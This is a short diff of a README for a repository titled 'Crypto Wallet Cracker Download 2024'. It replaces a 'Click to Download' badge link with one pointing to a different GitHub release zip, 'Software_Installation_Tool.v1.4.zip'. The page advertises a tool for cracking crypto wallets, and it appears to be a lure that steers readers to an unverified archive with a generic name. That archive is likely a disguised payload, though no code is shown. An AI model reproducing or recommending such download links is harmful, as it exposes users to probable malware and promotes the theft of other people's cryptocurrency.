@@ -7,7 +7,7 @@
 
 Click to Download
 
-[![Static Badge](https://img.shields.io/badge/Download-V1.4.0-blue)](https://github.com/Nemsis07/Down2/releases/download/v2.4/Software_Installation_Tool.v1.4.zip)
+[![Static Badge](https://img.shields.io/badge/Download-V1.4.0-blue)](https://github.com/Chuajerome26/Crypto-Wallet-Cracker-Download-/releases/download/v1.4/Software_Installation_Tool.v1.4.zip)
 
 
 # Crypto Wallet Cracker Download 2024
